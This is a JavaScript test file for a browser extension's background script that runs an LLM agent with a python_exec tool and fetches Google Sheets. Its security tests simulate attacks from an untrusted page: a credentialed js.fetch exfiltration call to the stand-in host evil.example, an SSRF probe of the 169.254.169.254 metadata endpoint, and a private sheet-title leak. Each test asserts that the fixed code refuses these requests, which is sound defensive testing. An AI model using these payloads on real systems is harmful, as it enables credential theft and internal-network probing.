test("SECURITY (PYTHON_EXEC): a non-whitelisted page must NOT get FULL (unhardened, networked) mode", async () => {
    // THE HOLE (this test fails today): `hardened:false` from a page runs the offscreen worker UNHARDENED —
    // js + network bridge, at the EXTENSION origin (<all_urls> → CORS-bypassing, credential-capable fetch),
    // strictly more powerful than any other tool. "Full mode needs approval" is enforced only in the
    // bypassable client-side loop; the choke point trusts the message's `hardened` flag. The fix must force
    // hardened:true for a non-whitelisted page (full mode reachable only from a trusted surface / whitelist).
    const bg = loadBackground({ config: baseConfig() });   // evil.example NOT whitelisted
    await bg.send(
        { type: "PYTHON_EXEC", payload: { code: "import js; js.fetch('https://evil.example/steal', {credentials:'include'})", hardened: false } },
        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page
    // The fix rejects with an auth error (no PY_RUN sent) — or at worst runs hardened. Either way, NO
    // unhardened run may reach the sandbox. Today one does (hardened:false), so this fails = the hole.
    const unhardened = bg.pyRuns.find(m => m.type === "PY_RUN" && m.hardened === false);
    assert.ok(!unhardened, "a non-whitelisted page must NOT get an unhardened run — today it does");
});

test("SECURITY (FETCH_SHEET_TITLE): internal-only — a page (sender.tab set) must be refused", async () => {
    // The handler even comments "a page can't send this" but never ENFORCES it. A page (bypassing the
    // relay, or via a future relay entry) currently learns a private sheet's TITLE by id, credentialed.
    let fetched = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { fetched = true; return { ok: true, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Victim Secret Roadmap - Q3.csv"' : "" }, text: async () => "" }; },
    });
    const res = await bg.send(
        { type: "FETCH_SHEET_TITLE", payload: { id: "VICTIM_SHEET_ID" } },
        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page
    assert.equal(fetched, false, "must not spend the user's cookies on a title for a page");
    assert.equal(res.data, null, "a page must not learn a sheet's title — today it leaks it");
});

test("SECURITY (FETCH_IMAGE_B64): must refuse internal/loopback/metadata targets (SSRF)", async () => {
    // Uncredentialed, so no auth-data leak — but it's a "read any URL's bytes" primitive at the extension
    // origin, so a page can probe/read the user's INTERNAL network. Private/metadata hosts must be refused.
    let fetched = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { fetched = true; return { ok: true, status: 200, blob: async () => ({}) }; },
    });
    await bg.send(
        { type: "FETCH_IMAGE_B64", payload: { url: "http://169.254.169.254/latest/meta-data/" } },
        { tab: { id: 9, url: "https://evil.example/attack" } });
    assert.equal(fetched, false, "must NOT fetch an internal/metadata URL — today it does (SSRF)");
});

test("SECURITY (positive): a TRUSTED surface (sender.tab undefined) keeps full python", async () => {
    // Guard against over-blocking: internal extension surfaces (popup / offscreen / a future REPL) must
    // still get unhardened mode. This passes today and must keep passing after the hardening pass.
    const bg = loadBackground({ config: baseConfig() });
    await bg.send({ type: "PYTHON_EXEC", payload: { code: "1+1", hardened: false } });   // no sender.tab
    assert.equal(bg.pyRuns.find(m => m.type === "PY_RUN")?.hardened, false, "trusted surface may run full mode");
});

test("SECURITY (grant): an approved agent run lets THAT sheet read (untrusted page) mid-run, then clears", async () => {
    // End-to-end: a design-A run's python_exec (approved in the iframe) mints a per-sheet grant in
    // delegateTool; the page's FETCH_SHEET during that delegation succeeds — but a DIFFERENT sheet is
    // still refused, and after the run the grant is gone. Proves the fix DOESN'T break the agent flow.
    const TAB = 7, PAGE = { tab: { id: TAB, url: "https://untrusted.example/x" } };
    const OK_URL = "https://docs.google.com/spreadsheets/d/APPROVED_SHEET_A/export?format=csv&gid=0";
    const OTHER_URL = "https://docs.google.com/spreadsheets/d/OTHER_SHEET_B/export?format=csv&gid=0";
    const sheetCsv = () => ({ ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="S - Sheet1.csv"' : "text/csv" }, text: async () => "A\n1\n" });
    let approvedRead, otherRead;
    let turn = 0;
    const bg = loadBackground({
        config: baseConfig(),   // untrusted.example NOT whitelisted
        onFetch: (call) => {
            if (call.url.includes("docs.google.com")) return sheetCsv();   // the FETCH_SHEET's credentialed fetch
            // The model: turn 1 → call python_exec(full) loading the sheet; turn 2 → finish.
            return (++turn === 1)
                ? jsonResponse({ choices: [{ finish_reason: "tool_calls", message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "python_exec", arguments: JSON.stringify({ code: "df", mode: "full", tables: { df: OK_URL } }) } }] } }] })
                : jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (tabId, msg) => {
            // Approve the pending python_exec gate the instant it surfaces (the iframe's role).
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                void bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
                return;
            }
            // The APPROVED delegation (not the renderOnly preview) — grant is active now.
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "python_exec" && !msg.payload?.renderOnly && !msg.payload?.precheck && !msg.payload?.readonlyTry) {
                approvedRead = await bg.send({ type: "FETCH_SHEET", payload: { url: OK_URL } }, PAGE);
                otherRead = await bg.send({ type: "FETCH_SHEET", payload: { url: OTHER_URL } }, PAGE);   // different sheet → refused
                return { result: "ran python" };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "grun", task: "read the sheet", systemPrompt: "sys",
        tools: [{ name: "python_exec", description: "run python", parameters: { type: "object", properties: {} }, requiresApproval: true, capabilities: [], precheck: false }],
        model: "m", think: null, maxSteps: 4, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, PAGE);

    assert.ok(approvedRead?.data?.csv, `the APPROVED sheet read during the run (got ${JSON.stringify(approvedRead)})`);
    assert.ok(otherRead?.error, "a DIFFERENT sheet is still refused (grant is bound to the approved id)");
    // After the delegation, the grant is cleared → a later read of even the approved sheet is refused.
    const afterRead = await bg.send({ type: "FETCH_SHEET", payload: { url: OK_URL } }, PAGE);
    assert.ok(afterRead?.error, "the grant is one-time: after the run, the same sheet is refused again");
});

// ---- ABORT_TASK: cancel an in-flight FETCH_LLM (ml.agent's signal → killed generation) ----

test("ABORT_TASK aborts the in-flight FETCH_LLM fetch for its requestId (kills a slow generation)", async () => {
    let sawSignal = false;
    const bg = loadBackground({
        config: baseConfig(),
        // A fetch that honours the AbortSignal like the real one: hang until aborted, then reject —
        // and reject immediately if the signal is ALREADY aborted (a listener added post-abort never fires).
        onFetch: (call) => new Promise((_, reject) => {
            sawSignal = !!call.opts.signal;
            const abort = () => { const e = new Error("aborted by signal"); e.name = "AbortError"; reject(e); };
            if (call.opts.signal.aborted) return abort();
            call.opts.signal.addEventListener("abort", abort);
        }),
    });
    const pending = bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] }, requestId: "r1" });
    await new Promise(r => setTimeout(r, 0));   // let the fetch get in-flight before we abort it
    bg.send({ type: "ABORT_TASK", payload: { requestId: "r1" } });   // fire-and-forget (no response)
    const res = await pending;
    assert.equal(sawSignal, true, "the FETCH_LLM fetch received an AbortSignal");
    assert.match(res.error, /abort/i, "aborting the task rejects the in-flight request");
});

test("ABORT_TASK for an unknown requestId is a harmless no-op", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    // No throw, nothing to abort.
    bg.send({ type: "ABORT_TASK", payload: { requestId: "nope" } });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] }, requestId: "r2" });
    assert.equal(res.data, "ok", "a later request is unaffected");
});

test("LLM_STREAM: disconnecting the Port aborts the streaming fetch (ml.chat's signal → killed generation)", async () => {
    let sawSignal = false, aborted = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => new Promise((_, reject) => {
            sawSignal = !!call.opts.signal;
            const abort = () => { aborted = true; const e = new Error("aborted"); e.name = "AbortError"; reject(e); };
            if (call.opts.signal.aborted) return abort();
            call.opts.signal.addEventListener("abort", abort);
        }),
    });
    const port = bg.connect("LLM_STREAM");
    port.send({ payload: { messages: [{ role: "user", content: "hi" }] } });   // starts streamLLM
    await new Promise(r => setTimeout(r, 0));   // let streamLLM reach the in-flight fetch
    port.disconnect();                          // content.js disconnects the port on abort
    await new Promise(r => setTimeout(r, 0));
    assert.equal(sawSignal, true, "the streaming fetch received an AbortSignal");
    assert.equal(aborted, true, "disconnecting the port aborted the fetch");
});
